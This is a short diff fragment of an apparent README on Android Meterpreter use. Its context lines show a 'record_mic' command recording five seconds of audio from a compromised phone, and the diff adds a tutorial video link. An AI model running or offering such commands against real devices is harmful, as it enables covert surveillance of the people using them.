@@ -20,3 +20,6 @@ meterpreter > record_mic -d 5
 Audio saved to: /root/android/TLbcSexf.wav
 meterpreter >
 ```
+Tuturial:
+https://youtu.be/WDRiazpjrwk?si=kY3CVy4QxuU-zTD4
+
